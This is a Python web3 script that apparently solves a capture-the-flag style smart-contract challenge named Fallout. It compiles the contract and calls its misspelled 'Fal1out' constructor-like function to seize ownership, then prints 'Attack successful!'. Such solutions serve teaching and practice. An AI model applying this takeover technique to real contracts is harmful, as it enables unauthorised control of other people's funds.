import web3
import solcx
from dotenv import load_dotenv
import os

load_dotenv()

# load variables from .env
wallet_private_key = os.getenv("WALLET_PRIVATE_KEY")
wallet_address = os.getenv("WALLET_ADDRESS")
w3 = web3.Web3(web3.HTTPProvider(os.getenv("WEB3_PROVIDER")))

contract_address = "0x2CC4F047e8A24490EB12455132668C73A0E36706"

# function to read contract source code, generate an abi, and create a contract object
def read_contract_return_abi(contract_file, contract_address, w3):
    with open(contract_file, "r") as f:
        contract_source = f.read()
        f.close()

    # install solc version 0.6.0 in case it's not installed.
    solcx.install_solc("0.6.0")
    solcx.set_solc_version("0.6.0")
    compiled_sol = solcx.compile_source(contract_source)

    # get abi from compiled_sol, <stdin> is the placeholder for the file name we chose.
    abi = compiled_sol["<stdin>:Fallout"]["abi"]

    contract = w3.eth.contract(address=contract_address, abi=abi)

    return contract

# function to send a transaction and return a receipt
def sign_and_send_transaction(w3, wallet_private_key, tx):
    signed_tx = w3.eth.account.sign_transaction(tx, wallet_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    return tx_receipt

def main():
    fallout = read_contract_return_abi("./fallout.sol", contract_address, w3)

    fal1out_tx_fields = {
        "value": 1,
        "gas": 70_000,
        "gasPrice": w3.to_wei("5", "gwei"),
        "nonce": w3.eth.get_transaction_count(wallet_address)
    }

    fal1out_tx = fallout.functions.Fal1out().build_transaction(fal1out_tx_fields)

    fal1out_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, fal1out_tx)

    if fal1out_tx_receipt["status"] == 1:
        print("Attack successful!")

if __name__ == "__main__":
    main()